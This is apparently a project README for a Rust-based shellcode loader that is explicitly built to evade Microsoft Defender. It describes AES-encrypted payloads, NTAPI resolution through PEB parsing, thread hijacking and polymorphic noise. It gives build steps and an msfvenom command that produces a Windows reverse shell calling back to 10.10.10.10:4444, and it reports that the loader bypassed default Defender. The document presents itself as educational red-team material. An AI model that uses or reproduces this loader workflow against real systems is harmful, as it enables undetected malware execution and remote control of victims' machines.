## Overview

This project is a Rust-based shellcode loader designed to bypass Microsoft Defender using multiple advanced evasion techniques.
It demonstrates how a combination of encryption, NTAPI usage, thread hijacking, and polymorphism can be used to load and execute shellcode in memory without triggering common static or dynamic defenses.
⚠️ For educational and red-team research purposes only. Do not use this for malicious activity.

### Features

✅ AES-256-CBC encryption of shellcode
✅ Manual NTAPI resolution via PEB parsing (no WinAPI usage)
✅ Thread hijacking to bypass runtime memory scanning
✅ In-memory decryption (no disk artifacts)
✅ Encrypted sleep (using NtDelayExecution)
✅ Dead code and fake processes for static noise
✅ Polymorphic behavior (random delays, execution flow)


### Requirements

Rust (stable toolchain)
Windows (x64) target
Shellcode to inject (e.g., reverse shell via msfvenom)


### Building

1. Clone the repository:

```
git clone https://github.com/yourusername/rust-shellcode-loader.git
cd rust-shellcode-loader
```

2. Add your encrypted shellcode:

Use a separate tool or the provided encrypter to encrypt your shellcode (AES-256-CBC).
Embed the result in your main.rs:

```
static ENCRYPTED_SHELLCODE: &[u8] = &[...];
static ENCRYPTION_KEY: [u8; 32] = [...];
static ENCRYPTION_IV: [u8; 16] = [...];
```

3. Build the project in release mode:

```
cargo build --release
```

Run the binary on a target Windows machine.

### Shellcode Generation (Example)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 --smallest -f raw -o shellcode.bin
```

### Shellcode Encryption (Rust tool)

Use the provided Rust-based encryption tool:
```
.\encrypter.exe shellcode.bin
```

This will output:

- Encrypted shellcode
- AES key and IV
- Copy/paste block to include directly in your loader

  ---
```
📦 Project Structure
├── src/
│   ├── main.rs                  // Entry point with shellcode loader logic
│   ├── decrypt.rs               // AES decryption logic
│   ├── evasion/
│   │   ├── anti_debug.rs        // PEB anti-debug and encrypted sleep
│   │   ├── fake_processes.rs    // Dead code and fake process behavior
│   │   └── dead_code.rs         // Unused polymorphic noise code
│   ├── execute/
│   │   └── thread_hijack.rs     // Thread hijacking and delayed shellcode execution
│   └── native/
│       ├── file_ops.rs          // NTAPI-based file checks
│       ├── call.rs              // NTAPI function declarations
│       └── peb_parsing_by_hash.rs // PEB parsing and function resolution by hash
```


### How It Works

Uses PEB parsing to locate ntdll.dll and resolve function addresses dynamically (avoids static WinAPI detection).
The shellcode is AES-256 encrypted, decrypted in memory just before execution.
Instead of calling the shellcode directly, it is executed via thread hijacking (modifying RIP of a suspended thread).
The loader includes dead code and fake activity to increase entropy and evade static analysis.
Every build may produce slightly different binaries due to polymorphic behavior.


### Detection & Evasion

Static Analysis: No readable shellcode, no suspicious strings, no WinAPI imports
Dynamic Analysis: Delayed execution, non-standard memory regions
Defender Bypass: Tested successfully on default Windows Defender
CAPA / LitterBox: Only low-level suspicious behaviors detected; no malware signatures triggered

### Disclaimer

This project is for educational and research purposes only.
Use only in authorized environments where you have explicit permission to test.

The author does not condone or support malicious use of this code.

### References

[NTAPI & PEB Parsing](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/index.htm)
[Shellcode Encryption](https://github.com/RustCrypto/block-ciphers)
[Thread Hijacking Techniques](https://www.ired.team/offensive-security/code-injection/thread-hijacking)
